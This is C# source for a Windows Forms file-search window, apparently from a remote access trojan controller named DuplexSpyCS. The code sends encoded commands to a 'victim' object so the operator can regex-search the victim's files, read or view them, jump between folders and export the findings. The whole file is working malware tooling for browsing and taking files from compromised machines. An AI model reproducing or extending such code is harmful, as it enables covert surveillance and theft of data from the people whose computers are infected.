using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace DuplexSpyCS
{
    public partial class frmFileFind : Form
    {
        public clsVictim m_victim { get; init; }
        public frmManager m_fMgr { get; init; }
        public string m_szCurrentPath { get; init; }

        public frmFileFind(clsVictim victim, frmManager fMgr, string szCurrentPath)
        {
            InitializeComponent();

            m_victim = victim;
            m_fMgr = fMgr;
            m_szCurrentPath = szCurrentPath;
        }

        /// <summary>
        /// Show discovered folders and files.
        /// </summary>
        /// <param name="lsFolder"></param>
        /// <param name="lsFile"></param>
        public void ShowFindResult(List<(string, string, string)> lsFolder, List<(string, string, string)> lsFile)
        {
            if (lsFolder.Count == 0 && lsFile.Count == 0)
            {
                MessageBox.Show("Result: 0", "Nothing :(", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            List<(string, string, string)> results = new List<(string, string, string)>();
            results.AddRange(lsFolder);
            results.AddRange(lsFile);

            Invoke(new Action(() => toolStripProgressBar1.Maximum = results.Count));

            foreach (var x in results)
            {
                ListViewItem item = new ListViewItem(x.Item1);
                item.SubItems.Add(x.Item2);
                item.SubItems.Add(x.Item3);

                Invoke(new Action(() =>
                {
                    listView1.Items.Add(item);
                    toolStripProgressBar1.Increment(1);
                }));
            }

            Invoke(new Action(() => toolStripStatusLabel1.Text = $"Folder[{lsFolder.Count}], File[{lsFile.Count}]"));
        }

        void setup()
        {
            toolStripMenuItem7.DropDownItems.Add("All");
            toolStripMenuItem7.DropDownItems.Add(new ToolStripSeparator());

            toolStripMenuItem7.DropDownItems.Cast<ToolStripDropDownItem>().First().Click += (s, e) =>
            {
                List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
                if (items.Count == 0)
                    return;

                StringBuilder sb = new StringBuilder();
                foreach (ListViewItem item in items)
                    sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));

                Clipboard.SetText(sb.ToString());
            };

            int nIdx = 0;
            foreach (var col in listView1.Columns.Cast<ColumnHeader>().Select(x => x.Text))
            {
                ToolStripMenuItem item = new ToolStripMenuItem(col);

                toolStripMenuItem7.DropDownItems.Add(item);
                item.Click += (s, e) =>
                {
                    List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
                    if (items.Count == 0)
                        return;

                    int i = nIdx;
                    StringBuilder sb = new StringBuilder();
                    foreach (ListViewItem item in items)
                        sb.AppendLine(item.SubItems[i].Text);

                    Clipboard.SetText(sb.ToString());
                };

                nIdx++;
            }

            textBox1.Text = m_szCurrentPath;
            textBox2.Text = "RegexPattern.txt";

            toolStripStatusLabel1.Text = string.Empty;
        }

        private void frmFileFind_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Send "find" command.
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            toolStripProgressBar1.Value = 0;

            int method = 0; //0: Name only, 1: FullPath
            int ignoreCase = 1; //0: False, 1: True
            int itemType = 2; //0: Folder, 1: File, 2: All

            string[] paths = textBox1.Lines.Where(x => !string.Equals(x.Trim(), Environment.NewLine)).ToArray();
            string[] patterns = textBox2.Lines.Where(x => !string.Equals(x.Trim(), Environment.NewLine)).ToArray();

            new Thread(() =>
            {
                string b64Paths = string.Join(",", paths.Select(x => clsCrypto.b64E2Str(x)).ToArray());
                string b64Patterns = string.Join(",", patterns.Select(x => clsCrypto.b64E2Str(x)).ToArray());

                m_victim.fnSendCommand($"file|find|{b64Paths}|{b64Patterns}|{method}|{ignoreCase}|{itemType}");
            }).Start();
        }

        //Save Result
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            List<(string, string, string)> lsDatas = listView1.Items.Cast<ListViewItem>().Select(x => (x.Text, x.SubItems[1].Text, x.SubItems[2].Text)).ToList();

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Text File(*.txt)|*.txt|CSV File(*.csv)|*.csv|HTML File(*.html)|*.html";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                int dwFilterIndex = sfd.FilterIndex;
                switch (dwFilterIndex)
                {
                    case 0: //txt
                        File.WriteAllText(
                            sfd.FileName, //File Path

                            //File Content
                            "# Find result:\n" +
                            string.Join(Environment.NewLine, lsDatas.Select(x => $"{x.Item1},{x.Item2},{x.Item3}").ToArray())
                        );
                        break;
                    case 1: //csv
                        File.WriteAllText(
                            sfd.FileName, //File Path

                            //File Content
                            "Name,Type,Path\n" +
                            string.Join(Environment.NewLine, lsDatas.Select(x => $"{x.Item1},{x.Item2},{x.Item3}").ToArray())
                        );
                        break;
                    case 2: //html
                        string txtHTML = File.ReadAllText("config\\SaveHTML.txt");
                        string[] arrColumns = new string[] { "Name", "Type", "Path" };
                        string szColumns = string.Join(Environment.NewLine, arrColumns.Select(x => $"<th>{x}</th>").ToArray());
                        string szDatas = string.Join(Environment.NewLine, lsDatas.Select(x => $"<td>{x.Item1}</td>\n<td>{x.Item2}</td>\n<td>{x.Item3}</td>\n").Select(x => $"<tr>{x}</tr>\n").ToArray());

                        File.WriteAllText(
                            sfd.FileName,

                            //File Content
                            txtHTML.Replace("[COLUMNS]", szColumns).Replace("[DATAS]", szDatas)
                        );
                        break;
                }
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting();

            f.ShowDialog();
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\FileFind").Show();
        }

        //Edit File
        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
                return;

            var item = items.First();
            bool bDir = string.Equals("Directory", item.SubItems[1].Text);

            string szPath = item.SubItems[2].Text;

            if (bDir)
            {
                m_victim.SendCommand($"file|goto|{clsCrypto.b64E2Str(szPath)}");
                m_fMgr.BringToFront();
            }
            else
            {
                if (clsTools.FileIsImage(szPath))
                {
                    m_victim.fnSendCommand($"file|img|{clsCrypto.b64E2Str(szPath)}");
                }
                else
                {
                    m_victim.fnSendCommand($"file|read|" + clsCrypto.b64E2Str(szPath));
                }
            }
        }

        //Open Folder
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
            {
                MessageBox.Show("Number of items is zero!", "Nothing :(", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (items.Count > 1)
                MessageBox.Show("More than one directories are selected, the first directory will be used automatically.", "More than one!", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            ListViewItem item = items.First();
            string szPath = item.SubItems[2].Text;
            if (string.Equals(item.SubItems[1].Text, "File"))
                szPath = Path.GetDirectoryName(szPath);

            m_victim.SendCommand($"file|goto|{clsCrypto.b64E2Str(szPath)}");

            m_fMgr.BringToFront();
        }

        //Edit File
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().Where(x => string.Equals("File", x.Text)).ToList();
            if (items.Count == 0)
            {
                MessageBox.Show("Number of directory is zero!", "Nothing :(", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (ListViewItem item in items)
            {
                string szPath = item.SubItems[2].Text;

                if (clsTools.FileIsImage(szPath))
                {
                    m_victim.fnSendCommand($"file|img|{clsCrypto.b64E2Str(szPath)}");
                }
                else
                {
                    m_victim.fnSendCommand($"file|read|" + clsCrypto.b64E2Str(szPath));
                }
            }
        }
    }
}
